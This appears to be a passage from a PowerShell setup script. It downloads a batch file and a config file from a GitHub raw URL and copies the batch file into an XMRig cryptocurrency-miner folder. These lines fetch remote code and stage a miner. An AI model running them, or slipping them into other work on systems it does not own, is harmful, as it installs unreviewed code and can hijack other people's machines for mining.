...
Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/SOL/refs/heads/main/SOL_RUN.bat -OutFile C:\SOL_RUN.bat
Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/SOL/refs/heads/main/config.json -OutFile C:\config.json
Copy-Item -Path C:\SOL_RUN.bat -Destination C:\xmrig-6.22.2\SOL_RUN.bat -Force
